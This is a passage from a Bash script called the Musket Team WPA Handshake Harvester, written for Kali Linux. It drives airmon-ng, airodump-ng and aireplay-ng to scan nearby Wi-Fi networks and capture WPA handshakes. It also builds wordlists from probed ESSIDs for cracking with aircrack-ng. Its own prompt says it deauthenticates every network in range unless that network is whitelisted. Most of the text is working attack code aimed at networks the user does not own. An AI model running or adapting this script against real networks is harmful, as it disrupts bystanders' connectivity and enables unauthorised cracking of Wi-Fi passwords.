/tmp/ESSIDPROBE_DIR/essidprobesiX58dic.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $6 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX68dic.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $7 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX78dic.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $8 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX88dic.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $9 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX98dic.txt\n\ncat < /tmp/ESSIDPROBE_DIR/essidprobesX8dic.txt | awk '{ print $10 }' | uniq -u >> /tmp/ESSIDPROBE_DIR/essidprobesiX108dic.txt\n\ncat /tmp/ESSIDPROBE_DIR/essidprobesi*.txt >> /tmp/ESSIDPROBE_DIR/essidprobes11dic.txt\n\ncat /tmp/ESSIDPROBE_DIR/essidprobes11dic.txt | sed 's/^[ \\t]*//;s/[ \\t]*$//' > /tmp/ESSIDPROBE_DIR/essidprobes12dic.txt\n\necho \"[+] Sorting essidprobes8dic.txt\"\n\nrm -f /tmp/ESSIDPROBE_DIR/essidprobesi*.txt\n\ncat /tmp/ESSIDPROBE_DIR/essidprobes12dic.txt | awk 'length($0) > 7' > /tmp/ESSIDPROBE_DIR/essidprobes13dic.txt\n\ncat /tmp/ESSIDPROBE_DIR/essidprobes13dic.txt |  sort -u  > /tmp/ESSIDPROBE_DIR/essidprobes14dic.txt\n\necho \"[+] Transfering essidprobes8dic.txt to /root/PROBEESSID_DATA/\"\n\ncp -f /tmp/ESSIDPROBE_DIR/essidprobes14dic.txt /root/PROBEESSID_DATA/essidprobes8dic.txt \n\nsleep .2\n\n}\n\n#~~~~~~~~~~~~~~End ESSIDPROBE_fn End~~~~~~~~~~~~~~#\n\nESSIDREF_fn()\n\n{\n### essidreference ###\n\n\necho \"[+] Writing ESSID Reference\"\ncat < /tmp/ESSIDPROBE_DIR/allcsv.txt | awk 'BEGIN { FS =\",\" } ; { if((length($6) == 18 )) {print $1 \" \" $6 \" \" $7 \" \" $8 \" \" $9 \" \" $10 \" \" $11 }}' | sed 's/^[ \\t]*//;s/[ \\t]*$//' | sed '/^$/d' > /tmp/ESSIDPROBE_DIR/essidrefhold01.txt\n\nsleep 2\n\ncp -f /root/PROBEESSID_DATA/essidrefhold.txt /tmp/ESSIDPROBE_DIR/essidrefhold03.txt\n\ncat /tmp/ESSIDPROBE_DIR/essidrefhold01.txt >> /tmp/ESSIDPROBE_DIR/essidrefhold03.txt\n\nsleep .2\n \ncat /tmp/ESSIDPROBE_DIR/essidrefhold03.txt | sed 's/  / /g' | awk '{if(($3 != \"\")) {print $0 }}' >> /tmp/ESSIDPROBE_DIR/essidrefhold03c.txt\n\ncat /tmp/ESSIDPROBE_DIR/essidrefhold03c.txt | awk '{if(($4 != \"\")) {print $0 }}' >> /tmp/ESSIDPROBE_DIR/essidrefhold03b.txt\n\ncat /tmp/ESSIDPROBE_DIR/essidrefhold03b.txt | awk '{if(($3 != \"\")) {print $0 }}' >> /tmp/ESSIDPROBE_DIR/essidrefhold03a.txt\necho \"[+] Writing ESSID Reference Sort\"\ncat /tmp/ESSIDPROBE_DIR/essidrefhold03a.txt | sort -u | uniq -u > /tmp/ESSIDPROBE_DIR/essidrefhold04.txt\n\nsleep .2\n\nrm -f /root/PROBEESSID_DATA/essidrefhold.txt\n\nsleep .2\n\ncp -f /tmp/ESSIDPROBE_DIR/essidrefhold04.txt /root/PROBEESSID_DATA/essidrefhold.txt\n\nsleep .2\n\necho \"[+] Copying any ESSID Probes obtained thru\"\necho \"[+] airodump-ng to the /root/PROBEESSID_DATA folder\"\n\nrm -f /tmp/ESSIDPROBE_DIR/*.csv\n\nsleep 3\n\n}\n\n#~~~~~~~~~~~~~~End ESSIDPROBE_fn End~~~~~~~~~~~~~~#\n\nwhite_ap_mac_fn()\n{\n\nWHITELTEST=ZZZ\n\nclear\n\nuntil  [ $WHITELTEST == y ] || [ $WHITELTEST == Y ]; do  \n\n\necho \"\"\necho \"\"\necho -e \"$info$bold  $undr White Listing Networks $txtrst\"\necho \"\"\n\n\necho -e \"$info     This script will deauth ALL Networks within the reception range\"\necho -e \"  of the wifi device. You can White-List any network and that network will\"\necho -e \"  not undergo deauthorization from aireplay-ng -0. Mac addresses of those\"\necho -e \"  networks you wish to white-list will be required.\"\necho \"\"\necho -e \"$inp     If you wish to whitelist any networks. Enter$yel (y/Y)$q.\"\necho -e \"$inp  Enter$yel (n/N)$inp to not use the feature.$txtrst\"\nread WHITEL\n\n\tif [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then\n\n\tWHITELTEST=y\n\n\telse\n\n\twhile true\n\tdo\n\n   echo \"\"\n   echo -e  \"$inp      You entered$yel $WHITEL$inp  Select$yel (y/Y)$inp to continue.\"\n   echo -e  \"$inp  Select$yel (n/N)$inp to try again.$txtrst\"\nread WHITELTEST\n\n\tcase $WHITELTEST in\n\ty|Y|n|N) break ;;\n\t~|~~)\n\techo Aborting -\n\texit\n\t;;\n\n\tesac\n\techo -e  \"$warn  !!!Wrong input try again!!!$txtrst\"\n\n\tdone\n\n\tfi\n\n\tclear\n\t\tdone\n\nif  [ $WHITEL == y ] || [ $WHITEL == Y ]; then\n\nwhitelist=$(ls -A1 /root/HANDSHAKEHOLD/* | xargs -n 1 basename | dos2unix | awk -F \"-\" '/whitelist/ {print $1 \"-\" $2 }')  # > /tmp/HANDTEST/whitelist\n\n                 if [[ -z $whitelist ]]; then\n\techo \"\"\n\techo -e \"$info    There are currently no APs whitelisted.\"\n\n\t\telse\n\n\techo \"\"\n\techo -e \"$info    APs currently whitelisted are seen below. If you wish to\"\n\techo -e \"$info  remove any whitelisted APs open the$yel /root/HANDSHAKEHOLD\"\n\techo -e \"$info  folder and erase the whitelist file from the folder.$txtrst\"\n\techo \"\"\n\techo \"$whitelist\"\n\n\t\t\tfi\n\n\techo \"\"\n\techo -e \"$inp    Enter the mac address of the device you wish to White-List.\"\n        echo -e \"$inp  Enter in this format$yel 55:44:33:22:11:00$inp ONLY!!!\"\n        echo \"\"\n        echo -e \"$info Some error handeling exists for this entry.$txtrst\"\n\tread ap_mac\n\n\t\t\twhite_ap_mac_test_fn\n\n\t\tfi\n\n}\n\n#~~~~~~~~~~~~~~~Start  Mac Error Handling Star~~~~~~~~~~~~~~~#\n\nwhite_ap_mac_test_fn()\n\n{\n\n# Error Handling For Mac Code Entries\n# Tests Length of string\n# Tests  Presence of only ::::: punctuation characters\n# Tests only hex charcters present\n#Sets correct puntuation for test\n\nMACPUNCT=\":::::\"\n\nsleep .2\n\n#Tests punctuation\n\nPUNCTEST=`echo \"$ap_mac\" | tr -d -c \".[:punct:]\"`\n\nsleep .2\n\nif [ \"$PUNCTEST\" == \"$MACPUNCT\" ]\n\n\tthen\n\n\t    PUNCT=1\n\n\telse\n\n\t    PUNCT=0\n\n\tfi\n\nsleep .2\n\n#Tests hex characters\n\nMACALNUM=`echo \"$ap_mac\" | tr -d -c \".[:alnum:]\"`\n\nsleep .2\n\nif [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]\n\nthen\n\n\tALNUM=1\nelse\n\n\tALNUM=0\n  fi\n\nsleep .2\n\n#Tests string length\n\nif [ ${#ap_mac} = 17 ]\n\nthen\n\n\tMACLEN=1\nelse\n\n\tMACLEN=0\n  fi\n\nsleep .2\n\n# All variables set to ones  and zeros\n\nuntil [ $MACLEN == 1 ] && [ $PUNCT == 1 ] && [ $ALNUM == 1 ]; do\n\n\tif [ $ALNUM == 0 ]; then\n\t\techo -e \"$warn  You are using a non-hex character.$txtrst\"\n\n\t\t\tfi\n\t\n\tif [ $MACLEN == 0 ]; then\n\t\techo -e \"$warn  Your Mac code is the wrong length.$txtrst\"\n\n\t\t\tfi\n\n\tif [ $PUNCT == 0 ]; then\n\n\t\techo -e \"$warn  You have entered the wrong and/or too many separators - use ONLY colons :$txtrst\"\n\n\t\t\tfi\n\n\techo -e \"$info  Mac code entry incorrect!!!\"\n        echo \"  You must use format 00:11:22:33:44:55 or aa:AA:bb:BB:cc:CC\"\n\techo \"  Only a thru f, A thru F, 0 thru 9 and the symbol :  are allowed.\"\n\techo -e \"$inp  Reenter Mac code and try again(ap_mac).$txtrst\"\n\tread ap_mac\n\n        MACALNUM=`echo \"$ap_mac\" | tr -d -c \".[:alnum:]\"`\n\tif [[ $MACALNUM =~ [A-Fa-f0-9]{12} ]]\n\n        then\n\n        \tALNUM=1\n\n        else\n\n\t        ALNUM=0\n\n\t\t\tfi\n\nsleep .2       \n\n\tif [ ${#ap_mac} == 17 ]\n\n\tthen\n\n\t\tMACLEN=1\n\telse\n\n\t\tMACLEN=0\n\n\t\t\tfi\n\nsleep .2\n\n\tPUNCTEST=`echo \"$ap_mac\" | tr -d -c \".[:punct:]\"`\n\tif [ $PUNCTEST == $MACPUNCT ]\n\n\tthen\n\n\t    PUNCT=1\n\n\telse\n\n\t    PUNCT=0\n\n\t\t\tfi\n\nsleep 1\n\ndone\n\necho $ap_mac > /root/HANDSHAKEHOLD/$ap_mac-whitelist\nsleep 1\n\necho -e \"$inp     Enter$yel (y/Y)$inp to white list another device.\"\necho -e \"$inp  Enter$yel (n/N)$inp to continue to main program.$txtrst\"\nread ANOTHER\n\n\t\tif  [[ $ANOTHER == y ]] || [[ $ANOTHER == y ]]; then\n\n\t\t\t\twhite_ap_mac_fn #loop for another check\n\n\t\t\t\t\tfi\n\n}\n#~~~~~~~~~~~~~~~Ends Mac Error Handling Ends~~~~~~~~~~~~~~~#\n\n#~~~~~~~~~~~~~~~Select Monitor~~~~~~~~~~~~~~~#\n\nSELECT_MONITOR_fn()\n{\n\nairmon-ng start $DEV &> /dev/null\n\nsleep 1\nMONTEST=ZZZ\nuntil  [ $MONTEST == y ] || [ $MONTEST == Y ]; do\n\necho -e  \"$txtrst\"\nairmon-ng | tee airmon01.txt\n\ncat < airmon01.txt | awk -F' ' '{ if(($1 != \"Interface\")) {print $1}}' > airmon02.txt\n\ncat < airmon02.txt | awk -F' ' '{ if(($1 != \"\")) {print $1}}' > airmon03.txt\n\n  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')\n\necho \"\"\necho -e \"$info Devices found by airmon-ng.$txtrst\"\necho \" \"\necho \"$AIRMONNAME\" | sed 's/^/       /'\necho \"\"\necho -e \"$q    What wireless monitor interface$yel (i.e. mon0, mon1)$q will\"\necho -e \"  be used by reaver?$txtrst\"\necho \"\"\nread  -p \"   Enter Line Number Here: \" grep_Line_Number\n\necho -e \"$txtrst\"\nMON=$(cat airmon03.txt| sed -n \"\"$grep_Line_Number\"p\")\n\n# Remove trailing white spaces leaves spaces between names intact\n\nMON=$(echo $MON | xargs)\n\nrm -f airmon01.txt\nrm -f airmon02.txt\nrm -f airmon03.txt\n\n\tif [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then\n\n\tMONTEST=y\n\n\telse\n\n\twhile true\n\tdo\n\necho \"\"\necho -e \"$inp  You entered$yel $MON$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst\"\nread MONTEST\n\n\tcase $MONTEST in\n\ty|Y|n|N) break ;;\n\t~|~~)\n\techo Aborting -\n\texit\n\t;;\n\n\tesac\n\techo -e  \"$warn  !!!Wrong input try again!!!$txtrst\"\n\n\tdone\n\n\t\tfi\n\n\t\t\tdone\n\n        clear\n}\n#~~~~~~~~~~~~~~~End Select Monitor End~~~~~~~~~~~~~~~#\n\nhandshakecollect()\n\n{\n\nnumber_of_files=$(ls -A /root/HANDSHAKEHOLD | wc -l)\n\nif [ \"$number_of_files\" != 0 ]; then\n\nsleep 3\n\nls -1 /root/HANDSHAKEHOLD/* | xargs -n1 basename | sed 's/-.*//' | dos2unix | tr [a-f] [A-F] | awk '{a [$1]++}! (a[$1]-1)' | cat > /tmp/HANDTEST/caplist.txt 2> /dev/null\n\n# Place in array\n\nsleep 2\n\nreadarray bssidcaplist < /tmp/HANDTEST/caplist.txt\n\nbssidvar=0\nmacadd=$(echo $BSSIDS |awk '{ print $'$numi1' }')\napname=$(echo $SSIDS |awk '{ print $'$numi1' }')\narrayqty=${#bssidcaplist[@]}\narraycnt=0\n\nuntil [[  $arraycnt -eq ${#bssidcaplist[@]} ]] || [[ $(echo ${bssidcaplist[$bssidvar]} | xargs | sed -e  's/^\\(.\\{17\\}\\).*$/\\1/') == $macadd ]] || [[  $numi1 == 0 ]] ; do\n\n\techo -e \"$txtrst[+]\"\n\techo \"[+] Starting test looking for cap files for $apname.\"\n#\techo \"[+] Checking /root/HANDSHAKEHOLD for $bssid.cap files.\"\n\techo \"[+] Checking /root/HANDSHAKEHOLD for $macadd.cap files.\"\n\techo -e \"$txtrst[+]\" \n\techo \".\"\n\tsleep .1\n\techo \"..\"\n\tsleep .1\t\n\techo \"...\"\n\tsleep .1\n\techo \"....\"\n\tsleep .1\n\techo \".....\"\n\tlet bssidvar=$bssidvar+1\n        let arraycnt=$arraycnt+1\ndone\n\nif [[ $(echo ${bssidcaplist[$bssidvar]} | xargs | sed -e  's/^\\(.\\{17\\}\\).*$/\\1/') == $macadd ]] && [[ $numi1 -gt 1 ]]; then\n\n\tnumi1=$(expr \"$numi1\" - 1)\n\techo \"[+] Handshake file for $apname FOUND!\"\n\techo \"[+] Skipping mac address $macadd.\"\n\tsleep 3\t\n\n\t\thandshakecollect\n     \n\n\t\t\tfi\n\nif [[ $(echo ${bssidcaplist[$bssidvar]} | xargs | sed -e  's/^\\(.\\{17\\}\\).*$/\\1/') == $macadd ]] && [[ $numi1 -eq 1 ]]; then\n\n          echo \"[+] Handshake file for $apname FOUND!\"\n\t\tsleep 3\n    \t\t\t passive_scan\n\n            fi\n\n\t\tfi\n\n}\n\npassive_scan()\n\n{\n\nkillall -q airodump-ng &>dev\\null\nsleep .2\nkillall -q aireplay-ng &>dev\\null\nsleep .2\nkillall -q xterm &>dev\\null\n\n\tif [[ \"$airmontype\" == \"Interface\" ]]; then\n\n\tairmon-ng stop $monitor &>dev\\null\n\n\tifconfig $DEV down &>dev\\null\n\n\tifconfig $DEV up &>dev\\null\n\n\tairmon-ng start $DEV &>dev\\null\n\n\t\tfi\n\n\tif [[ \"$airmontype\" != \"Interface\" ]]; then\n\n\tifconfig $DEV down\n\tiwconfig $DEV mode monitor\n\tifconfig $DEV up\n\n\n\t\tfi\n\nESSIDNAME=\n\nkillall -q airodump-ng &>dev\\null\nsleep .2\nkillall -q aireplay-ng &>dev\\null\nsleep .2\nkillall -q xterm &>dev\\null\nsleep .2\nkillall -q Eterm &>dev\\null\n\n#wpsavail=$(airodump-ng --help | grep -- wps | awk '{print $1}')\n\nif [[ $wpsavail == --wps ]]; then\n\nxterm -g 95x15-1+100 -T \"Airodump-ng Passive Scan\" -e \"airodump-ng --wps --berlin 10000000 --beacons -w /tmp/HANDTEST/allchan $monitor\" 2> /dev/null & passcan=$!\n\nelse \n\nxterm -g 95x15-1+100 -T \"Airodump-ng Passive Scan\" -e \"airodump-ng -w /tmp/HANDTEST/allchan $monitor\" 2> /dev/null & passcan=$!\n\n\tfi\n\n#Eterm -g 80x15-1+100 --cmod \"red\" -T \"Airodump-ng Passive Scan\" -e sh -c \"airodump-ng -w /tmp/HANDTEST/allchan $monitor\" 2> /dev/null &\n\nclear\n\necho \"\"\necho \"\"\necho -e \"$yel ***$info Entering Passive All Channel Scan With Airodump-ng$yel ***$txtrst\"\necho \"\"\necho -e \"     If valid handshake file found, it will be placed in the\"\necho -e \"   /root/HANDSHAKEHOLD/ folder as a passive time-stamped .cap file.\"\necho \"\"\nseconds=$PAUSE; date1=$((`date +%s` + $seconds)); \nwhile [ \"$date1\" -ne `date +%s` ]; do \necho -ne \"$info  Time before program restart $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\\r\"; \n\t\n\tdone\n\necho -e \"$txtrst\"\n\n\tkill $passcan 2>/dev\\null\n\tkillall -q airodump-ng &>dev\\null\n        killall -q aireplay-ng &>dev\\null \n\tkillall -q xterm &>dev\\null\n\n\tESSIDNAME=$(wpaclean /tmp/HANDTEST/allchan-01a.cap /tmp/HANDTEST/allchan-01.cap | awk -F ' ' '{if ($1 == \"Net\"){ print $3 }}')\n\n\t\tif [ ! -z $ESSIDNAME ]; then\n    \t\techo \"[+] !!!Handshake(s) Found in passive scan!!!\"\n\t\tDATEFILE=$(date +%y%m%d-%H:%M)\n\t\tcp /tmp/HANDTEST/allchan-01.cap /root/HANDSHAKEHOLD/\"passivescan-$DATEFILE.cap\"\n\t\tsleep 3\n\n\t\t\tfi\n\n\tlet COUNT=COUNT-1\n\n\n#countcsv1=`ls -1 /root/*.csv 2>/dev/null | wc -l`\n\n#echo \"1068 debug /root/*.csv $countcsv1\"\n\n#\tif [[ $countcsv1 != 0 ]]; then\n\n#\t\tcp -f /root/*.csv /tmp/ESSIDPROBE_DIR/ 2>/dev/null\n\n#\t\t\tfi\n\ncountcsv1=`ls -1 /tmp/HANDTEST/*.csv 2>/dev/null | wc -l`\n#echo \"1078 debug /root/*.csv $countcsv1\"\n\n\tif [[ $countcsv1 != 0 ]]; then\n\n\t\tcp -f /tmp/HANDTEST/*.csv  /tmp/ESSIDPROBE_DIR/ 2>/dev/null\n\t\tsleep 1\n\t\trm -f /tmp/HANDTEST/*\n\n\n\t\t\tfi\n\n\tif [ -f \"/tmp/ESSIDPROBE_DIR/*.csv\" ]; then\n\n\t\techo \"[+]\"\n\t\techo \"[+] Moving any possible WPA keys in clear text to\" \n\t\techo \"[+]   /root/PROBEESSID_DATA/essidprobesdic.txt\"\n\t\techo \"[+] for use with aircrack-ng,pyrite or elcomsoft.\"\n\t\techo \"[+]\"\t\n\t\tsleep 3\n\n\tif [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then\n\n\t\tESSIDPROBE_fn\n\n\t\t\tfi\n\n\tif [[ $USE_REF == y || $USE_REF == Y ]]; then\n\n\t\tESSIDREF_fn\n\n\t\t\tfi\n\n\t\tfi\n\n\techo -e \"[+] New scan of existing APs within reception range to begin.\"\n\tsleep 3\n\n\tif [[ \"$airmontype\" == \"Interface\" ]]; then\n\n\tairmon-ng stop $monitor &>dev\\null\n\n\tifconfig $DEV down &>dev\\null\n\n\tifconfig $DEV up &>dev\\null\n\n\t\tfi\n\n if [[ \"$airmontype\" != \"Interface\" ]]; then \n\n\tifconfig $DEV down &>dev\\null\n\tiwconfig $DEV mode manage &>dev\\null\n\tifconfig $DEV up &>dev\\null\n\n  \t\t   fi\n\n    killall -q airodump-ng &>dev\\null\n    killall -q aireplay-ng &>dev\\null  \n    killall -q xterm &>dev\\null\n\n\t\tprepare_fn\n\n}\n\nexit_fn()\n{\n\n    echo -e \"$txtrst\"\t\n    echo -e \"[+] removing programs\"\n    killall -q airodump-ng &>dev\\null\n    killall -q aireplay-ng &>dev\\null\n    killall -q airbase-ng aireplay-ng ferret hamster sslstrip # stop processes\n    killall -q Eterm &>dev\\null\n    killall -q xterm &>dev\\null\n    sleep 2\n\n if [[ \"$airmontype\" == \"Interface\" ]]; then\n\n    echo -e \"$txrst\"\n    echo -e \"[+] stopping monitor @ $monitor....\"\n    airmon-ng stop $monitor &>dev\\null # stop monitor\n\tifconfig $DEV up # pull up interface\n\tservice NetworkManager start # start the network manager\n\tsleep 2 \n\n\tfi\n\nif [[ \"$airmontype\" != \"Interface\" ]]; then\n\n    echo -e \"$txrst\"\n    echo -e \"[+] stopping monitor @ $monitor....\"\n    airmon-ng stop $monitor &>dev\\null # stop monitor\n    ifconfig $DEV down\n    iwconfig $DEV mode manage\n    ifconfig $DEV up\n\n    sleep 2\t\n\n\tfi\n\n\n\techo -e \"$txrst\"\n\techo -e \"[+] Happy Trails From Musket Teams.\"\n\texit 0\n}\n\ntrap exit_fn INT # trap exit\n\n# ~~~~~~~~~~  Environment Setup ~~~~~~~~~~ #\n\n# Text color variables - saves retyping these awful ANSI codes\n\ntxtrst=\"\\e[0m\"      # Text reset\ndef=\"\\e[1;34m\"\t    # default \t\t   blue\nwarn=\"\\e[1;31m\"     # warning\t\t   red\ninfo=\"\\e[1;34m\" \t# info             blue\nq=\"\\e[1;32m\"\t\t# questions        green\ninp=\"\\e[1;36m\"\t    # input variables  magenta\nyel=\"\\e[1;33m\"      # typed keyboard entries\nital=\"\\e[3m\"\t    # italic\nnorm=\"\\e[0m\"        # normal\nbold=\"\\e[1m\"        # bold\nundr=\"\\e[4m\"       # underline\n#  ANSI coding all thanks to Vulpi author of Pwnstar9.0\n\n# Default values\nUSE_PROBE=y\nUSE_REF=n\n\n################################\nclear\necho \"\"\necho -e \"handshakeharvest-K1-K2-K2016-4-0.sh\"\necho -e \"$yel                   ***************************************\"\necho -e \"$yel                   *$info Musket Team WPA Handshake Harvester$yel *\"\necho -e \"$yel                   ***************************************\"\necho \"\"\necho -e \"$warn                 !!!!FOR USE by the KALI-LINUX Community!!!!\"\necho \"\"\necho -e \"$info                          In Memory of Dorthy Hunt\"\necho -e \"$info                         United Airlines Flight 553\"\necho -e \"$info\"\necho -e \"$info                      ALL THANKS to:\"\necho -e \"$yel                                Nadav Cohen\"\necho -e \"$info                      Who's Work Showed Us An Easier Way\"     \necho -e \"$info                                    And\"\necho -e \"$yel                                Liam Scheff\"\necho -e \"$info                         Author of Offical Stories\"\necho -e \"$info                         May His Insights Continue\"\necho -e \"\"\necho -e \"$info     Debugging and program additions thanks to$yel MajorTom$info.\"\necho \"\"\necho -e \"$info     This program supports kali 1.1, kali 2.0 and Kali 2016 R. If kali 1.1 is\"\necho -e \"$info  used, uncheck Enable Networking thru Network Manager menu, right-hand corner\" \necho -e \"$info  of screen. Ensure Enable Wireless is selected, or a RF kill error may result.\"\n\nwhile true\n\ndo\necho -e \"$inp                              Press $yel(y/Y)$inp to continue....\"\necho -e \"         Press $yel(n/N)$inp to abort!!..Press any other key to try again:$txtrst\"\n\n  read CONFIRM\n  case $CONFIRM in\n    y|Y|YES|yes|Yes) break ;;\n    n|N|no|NO|No)\n      echo Aborting - you entered $CONFIRM\n      exit\n      ;;\n\n\t  esac\n\n\t\tdone\n\necho -e \"$info  You entered $CONFIRM.  Continuing ...$txtrst\"\nsleep 3\n\nclear\n\n#\n# Allow reduction of error handeling\nERRORCHK_fn\n\n\n\n\n#Test for ifconfig type ext output\nIFCONFIG_TYPE_fn\n\n########### Decide kali type\n\nKALI_L_fn()\n\n{\nKALI_TYPETEST=ZZZ\n\nuntil [ $KALI_TYPETEST == y ] || [ $KALI_TYPETEST == Y ]; do  \n\necho \"\"\necho \"\"\necho -e \"$info$bold  $undr Kali-Linux Operating System $txtrst\"\necho -e \"\"\n\necho -e \"$inp     Select the Kali-Linux Program Being Used.\"\necho \"\"\necho \"\"\necho -e \"$inp     Enter$yel (1)$inp if you are using Kali 1.\"\necho -e \"$inp  Enter$yel (2)$inp if you are using Kali 2..$txtrst\"\necho -e \"$inp  Enter$yel (3)$inp if you are using Kali 2016 Rolling..$txtrst\"\necho -e \"\"\t\n\tread KALI_TYPE\n\n\tif [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then\n\n\t\tKALI_TYPETEST=y\n\n\telse\n\n\twhile true\n\tdo\n\n   echo \"\"\n   echo -e  \"$inp      You entered$yel $KALI_TYPE$inp  Select$yel (y/Y)$inp to continue.\"\n   echo -e  \"$inp  Select$yel (n/N)$inp to try again.$txtrst\"\n\tread KALI_TYPETEST\n\n\tcase $KALI_TYPETEST in\n\ty|Y|n|N) break ;;\n\t~|~~)\n\techo Aborting -\n\texit\n\t;;\n\n\tesac\n\techo -e  \"$warn  !!!Wrong input try again!!!$txtrst\"\n\n\tdone\n\n\tfi\n\n\tclear\n\t\tdone\n\n}\n\n#~~~~~~~~~~~~~~Start Select to attack WPS locked routers Start~~~~~~~~~~~~~~#\n\n###########\n\nKALI_L_fn\n\nDEVTEST=ZZZ\n\n#/tmp/ESSIDPROBE_DIR=\"/tmp/ESSIDPROBE_DIR\"\n\nrm -f /tmp/HANDTEST/*\nrm -f /tmp/ESSIDPROBE_DIR/*\n\n#Make dir to test for ESSID\n\nif [ ! -d \"/tmp/ESSIDPROBE_DIR\" ]; then\n\n\tmkdir -p -m 700 /tmp/ESSIDPROBE_DIR;\n\n\tfi\n\n#Make dir to test for handshake\n\nif [ ! -d /tmp/\"HANDTEST\" ]; then\n\n    mkdir -p -m 700 /tmp/\"HANDTEST\";\n\n\tfi\n\nif [ ! -d \"HANDSHAKEHOLD\" ]; then\n\n    mkdir -p -m 700 \"HANDSHAKEHOLD\";\n\n\tfi\n\n#Make hold file in /tmp file\n\nif [ ! -d \"/root/PROBEESSID_DATA\" ]; then\n\n\tmkdir -p -m 700 /root/PROBEESSID_DATA;\n\n\tfi\n\nif [ ! -f \"/root/PROBEESSID_DATA/essidprobesdic.txt\" ]; then\n\n\ttouch /root/PROBEESSID_DATA/essidprobesdic.txt\n\n\tfi\n\nif [ ! -f \"/root/PROBEESSID_DATA/essidrefhold.txt\" ]; then\n\n\ttouch /root/PROBEESSID_DATA/essidrefhold.txt\n\n\tfi\n\n# Copy any .csv files found in root\n\ncountcsv1=`ls -1 /root/*.csv 2>/dev/null | wc -l`\n\n#echo \"1361 debug /root/*.csv $countcsv1\"\n\n\tif [[ $countcsv1 != 0 ]]; then\n\n\t\techo \"[+] Copying .csv files from root /tmp/ESSIDPROBE_DIR/.\"\n\t\tcp -f /root/*.csv /tmp/ESSIDPROBE_DIR/ 2>/dev/null\n\n\t\t\tfi\n\nSELECT_DEVICE_fn()\n{\n\nuntil  [ $DEVTEST == y ] || [ $DEVTEST == Y ]; do\n\nairmon-ng | cat > /tmp/airmontype.txt\n\nairmontype=$(cat < /tmp/airmontype.txt | awk -F' ' '{ if(($2 == \"Interface\")) {print $2}}')\n\nif [[ \"$airmontype\" != \"Interface\"  ]]; then\n\n      airmontype=ZZZ\n      airmon-ng stop mon10 &>dev\\null\n      airmon-ng stop mon9 &>dev\\null\n      airmon-ng stop mon8 &>dev\\null\n      airmon-ng stop mon7 &>dev\\null\n      airmon-ng stop mon6 &>dev\\null\n      airmon-ng stop mon5 &>dev\\null\n      airmon-ng stop mon4 &>dev\\null\n      airmon-ng stop mon3 &>dev\\null\n      airmon-ng stop mon2 &>dev\\null\n      airmon-ng stop mon1 &>dev\\null\n      airmon-ng stop mon0 &>dev\\null\n\n\tfi\n\n if [[ \"$airmontype\" == \"Interface\" ]]; then\n\n\tairmon-ng stop wlan10mon  &>dev\\null\n\tairmon-ng stop wlan9mon  &>dev\\null\n\tairmon-ng stop wlan8mon  &>dev\\null\n\tairmon-ng stop wlan7mon  &>dev\\null\n\tairmon-ng stop wlan6mon  &>dev\\null\n\tairmon-ng stop wlan5mon  &>dev\\null\n\tairmon-ng stop wlan4mon  &>dev\\null\n\tairmon-ng stop wlan3mon  &>dev\\null\n\tairmon-ng stop wlan2mon  &>dev\\null\n\tairmon-ng stop wlan1mon  &>dev\\null\n\tairmon-ng stop wlan0mon  &>dev\\null\n\necho -e  \"$txtrst\"\n\nairmon-ng | tee airmon01.txt \n\ncat < airmon01.txt | awk -F' ' '{ if(($2 != \"Interface\")) {print $2}}' > airmon02.txt\n\ncat < airmon02.txt | awk -F' ' '{ if(($1 != \"\")) {print $1}}' > airmon03.txt\n\n  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')\n\n\t\tfi\n\nif [[ \"$airmontype\" != \"Interface\" ]]; then\n\necho -e  \"$txtrst\"\nairmon-ng | tee airmon01.txt\n\ncat < airmon01.txt | awk -F' ' '{ if(($1 != \"Interface\")) {print $1}}' > airmon02.txt\n\ncat < airmon02.txt | awk -F' ' '{ if(($1 != \"\")) {print $1}}' > airmon03.txt\n\n\n#cat < airmon01.txt | awk -F' ' '{ if(($2 != \"Interface\")) {print $2}}' > airmon02.txt\n\n#cat < airmon02.txt | awk -F' ' '{ if(($1 != \"\")) {print $2}}' > airmon03.txt\n\n  AIRMONNAME=$(cat airmon03.txt | nl -ba -w 1  -s ': ')\n\n\t\tfi\n\necho \"\"\necho -e \"$info Devices found by airmon-ng.$txtrst\"\necho \" \"\necho \"$AIRMONNAME\" | sed 's/^/       /'\necho \"\"\necho -e \"$inp     Enter the$yel line number$inp of the wireless device$yel (i.e. wlan0, wlan1 etc)$inp\"\necho -e \"  to be used.\"\necho -e \"$warn  Device must support packet injection.$txtrst\"\necho \"\"\nread  -p \"  Enter Line Number Here: \" grep_Line_Number\n\necho -e \"$txtrst\"\nDEV=$(cat airmon03.txt| sed -n \"\"$grep_Line_Number\"p\")\n\n# Remove trailing white spaces leaves spaces between names intact\n\nDEV=$(echo $DEV | xargs)\n\nrm -f airmon01.txt\nrm -f airmon02.txt\nrm -f airmon03.txt\n\n\tif [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then\n\n\t\tDEVTEST=y\n\n\telse\n\n\twhile true\n\tdo\n\necho \"\"\necho -e \"$inp  You entered$yel $DEV$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst\"\nread DEVTEST\n\n\tcase $DEVTEST in\n\ty|Y|n|N) break ;;\n\t~|~~)\n\techo Aborting -\n\texit\n\t;;\n\n\tesac\n\techo -e  \"$warn  !!!Wrong input try again!!!$txtrst\"\n\n\tdone\n\n\tfi\n\n\t\tdone\n\nclear\n\n}\n\n#~~~~~~~~~~~~~~~End Select Device 